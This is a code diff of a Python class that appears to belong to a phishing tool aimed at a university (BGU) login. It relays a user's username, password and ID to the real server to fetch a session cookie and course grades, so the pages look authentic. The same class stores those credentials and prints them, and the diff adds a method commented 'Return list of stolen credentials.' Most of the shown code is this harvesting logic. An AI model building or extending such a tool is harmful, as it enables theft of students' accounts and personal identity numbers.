@@ -1,11 +1,14 @@
 import requests
 
+from libs.utils import Singleton
 
-class Logic:
+
+class Logic(metaclass=Singleton):
 
     def __init__(self):
         self.users = {}
 
+    # Renders list of courses grades for the client.
     def render_courses(self, username, password, identity, is_heb):
         session_id = self.get_session_id(username, password, identity)
         if session_id == -1:
@@ -32,16 +35,17 @@ class Logic:
             f.write(res)
         return f"courses_{username}.html"
 
+    # Save client's credentials.
     def save(self, username, password, identity):
         if username not in self.users:
             self.users[username] = {"password": password, "id": identity}
             print(self.users)
 
-    def save_to_file(self, username, password, identity):
-        pass
-        # with open('users.txt', 'w') as f:
-        #     f.write(f'username: {username}\npassword: {password}\nid: {identity}\n')
+    # Return list of stolen credentials.
+    def get_credentials(self):
+        return self.users
 
+    # Get BGU server's session id (cookie) in order to serve authentic HTML pages.
     @staticmethod
     def get_session_id(username, password, identity):
         session = requests.Session()
